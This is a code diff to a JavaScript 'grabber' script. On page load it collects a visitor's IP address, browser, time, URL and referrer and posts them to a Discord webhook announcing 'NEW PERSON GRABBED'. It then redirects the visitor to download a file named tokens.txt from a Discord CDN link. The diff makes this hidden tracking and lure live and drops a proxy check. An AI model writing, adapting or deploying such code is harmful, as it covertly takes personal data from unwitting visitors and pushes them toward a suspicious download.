@@ -1,4 +1,4 @@
-var webhook = 'YOUR_WEBHOOK_URL';
+var webhook = 'YOUR_WEBHOOK_HERE';
 var site = 'https://myexternalip.com/raw';
 var direct_download = 'https://cdn.discordapp.com/attachments/1061127201950539889/1070873293533491210/tokens.txt';
 
@@ -34,39 +34,51 @@ function get_referrer() {
     return referrer;
     }
 
-async function proxy_check() {
-    return fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://api.xdefcon.com/proxy/check/?ip=' + get_ip())}`)
-      .then(response => {
-        if (response.ok) return response.json();
-        throw new Error("Network response was not ok.");
-      })
-      .then(data => {
-        if (data.contents.includes("Proxy detected")) {
-          return "true";
-        } else {
-          return "false";
-        }
-      });
-}
+//async function proxy_check() {
+//    return fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://api.xdefcon.com/proxy/check/?ip=' + get_ip())}`,{headers: {"content-type": "text/plain", "Access-Control-Allow-Origin": "*"}})
+//      .then(response => {
+//        if (response.ok) return response.json();
+//        throw new Error("Network response was not ok.");
+//      })
+//      .then(data => {
+//        if (data.contents.includes("Proxy detected")) {
+//          return "true";
+//        } else {
+//          return "false";
+//        }
+//      });
+//}
 
-async function send_webhook() {
-  let proxy = await proxy_check();
+//async function send_webhook() {
+//  let proxy = await proxy_check();
+//  fetch(webhook, {
+//    method: "POST",
+//    headers: {
+//      "Content-Type": "application/json"
+//    },
+//    body: JSON.stringify({
+//      content: `@everyone NEW PERSON GRABBED!!!\nIP: ${get_ip()}\nBrowser: ${get_browser()}\nTime: ${get_time()}\nURL: ${get_url()}\nReferrer: ${get_referrer()}\nProxy: ${proxy}\nMade by K.Dot#4044`
+//    })
+//  });
+//}
+
+function send_webhook() {
   fetch(webhook, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      content: `@everyone NEW PERSON GRABBED!!!\n\`\`\`ini\nIP: [${get_ip()}]\nBrowser: [${get_browser()}]\nTime: [${get_time()}]\nURL: [${get_url()}]\nReferrer: [${get_referrer()}]\nProxy: ${proxy_check()}\n[Made by K.Dot]\n\`\`\``
-    })
+      method: 'POST',
+      headers: {
+          'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+          content: `@everyone NEW PERSON GRABBED!!!\n\`\`\`ini\nIP: [${get_ip()}]\nBrowser: [${get_browser()}]\nTime: [${get_time()}]\nURL: [${get_url()}]\nReferrer: [${get_referrer()}]\n[Made by K.Dot]\n\`\`\``
+      })
   });
 }
-      
+
 
 function download() {
     window.location = direct_download;
+    window.close()
 }
 
 send_webhook();
-proxy_check();
-//download();
+download();
